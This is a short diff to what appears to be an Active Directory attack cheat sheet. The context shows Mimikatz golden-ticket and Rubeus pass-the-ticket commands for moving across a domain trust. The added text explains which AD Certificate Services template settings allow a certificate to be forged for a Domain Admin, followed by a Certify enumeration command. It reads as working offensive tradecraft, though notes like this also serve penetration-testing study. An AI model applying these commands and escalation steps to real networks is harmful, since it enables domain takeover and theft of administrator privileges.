@@ -302,8 +302,13 @@ C:> C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:
 # Create a TGS using the created ticket
 C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/eurocorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
 ```
-### Across Domain Trusts AD Certificate Services
+### AD Certificate Services
 ---
+Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.
+
+This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA") and use the captured certificate with Rubeus to forge authentication.
+
+Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.
 ```powershell
 # Enumerate AD CS in the target forest
 C:> Certify.exe cas
